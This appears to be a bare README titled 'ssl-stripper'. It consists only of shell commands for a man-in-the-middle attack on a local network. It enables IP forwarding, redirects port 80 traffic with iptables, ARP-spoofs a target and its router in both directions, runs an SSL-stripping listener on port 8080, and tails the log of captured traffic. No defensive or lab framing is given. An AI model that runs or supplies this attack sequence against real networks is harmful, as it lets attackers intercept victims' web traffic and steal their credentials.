# ssl-stripper

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

```
arpspoof -i eth0 -t <router ip> -r <target ip>
arpspoof -i eth0 -t <target ip> -r <router ip>
```

```
ssl -l 8080
```

```
tail -f sslstrip.log
```
